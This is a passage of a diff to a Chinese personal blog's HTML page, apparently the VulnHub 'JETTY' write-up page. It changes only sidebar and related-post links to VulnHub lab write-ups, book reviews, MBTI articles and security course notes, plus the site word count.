VENUS">VULNHUB VENUS</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li class="active"><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li>
+          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li class="active"><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -488,12 +524,12 @@ pip install uncompyle</p>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -515,6 +551,46 @@ pip install uncompyle</p>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="XD22 9 权限提升">XD22 9 权限提升</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" title="XD22 13 补充知识">XD22 13 补充知识</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/" title="《一句顶一万句》刘震云">《一句顶一万句》刘震云</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
@@ -528,17 +604,17 @@ pip install uncompyle</p>
 <a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/57%E3%80%8A%E4%B8%8D%E6%9C%BD%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/" title="《不朽》米兰·昆德拉">《不朽》米兰·昆德拉</a></span>
+    <span><a href="/2019/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/" title="《我是猫》夏目漱石">《我是猫》夏目漱石</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/132%20JETTY/" title="VULNHUB JETTY">VULNHUB JETTY</a></span>
+    <span><a href="/2019/07/01/BOOK/13%E3%80%8A%E4%BA%BA%E8%A6%81%E6%9C%89%E7%82%B9%E4%BF%A1%E4%BB%B0%E3%80%8B%E6%9D%8E%E5%A4%A7%E4%BC%9F/" title="《人要有点信仰》李大伟">《人要有点信仰》李大伟</a></span>
   </li>
 
       
@@ -548,67 +624,27 @@ pip install uncompyle</p>
 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></span>
+    <span><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="XD22 12 权限维持">XD22 12 权限维持</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/70%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B%E5%B2%B8%E8%A7%81%E4%B8%80%E9%83%8E/" title="《被讨厌的勇气》岸见一郎">《被讨厌的勇气》岸见一郎</a></span>
+    <span><a href="/2020/04/01/MBTI/INTP%E8%A7%A3%E8%AF%BB/" title="INTP解读">INTP解读</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/11%E3%80%8A%E9%98%BF%E5%BC%A5%E9%99%80%E4%BD%9B%E4%B9%88%E4%B9%88%E5%93%92%E3%80%8B%E5%A4%A7%E5%86%B0/" title="《阿弥陀佛么么哒》大冰">《阿弥陀佛么么哒》大冰</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/4%E3%80%8A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC%E3%80%8B%E5%A4%AA%E5%AE%B0%E6%B2%BB/" title="《人间失格》太宰治">《人间失格》太宰治</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/38%E3%80%8A%E5%84%BF%E5%AD%90%E4%B8%8E%E6%83%85%E4%BA%BA%E3%80%8B%E5%8A%B3%E4%BC%A6%E6%96%AF/" title="《儿子与情人》劳伦斯">《儿子与情人》劳伦斯</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/22%E3%80%8A%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9%E3%80%8B%E6%88%B4%E5%B0%94%C2%B7%E5%8D%A1%E8%80%90%E5%9F%BA/" title="《人性的弱点》戴尔·卡耐基">《人性的弱点》戴尔·卡耐基</a></span>
+    <span><a href="/2020/04/01/MBTI/ESTJ%E8%A7%A3%E8%AF%BB/" title="ESTJ解读">ESTJ解读</a></span>
   </li>
 
   </ul>
@@ -633,13 +669,13 @@ pip install uncompyle</p>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">746k 字</span>
+    <span title="站点总字数">748k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:44</span>
+    <span title="站点阅读时长">20:46</span>
   </div>
 
 <!--   自定义开启一个网站的运行时间 -->
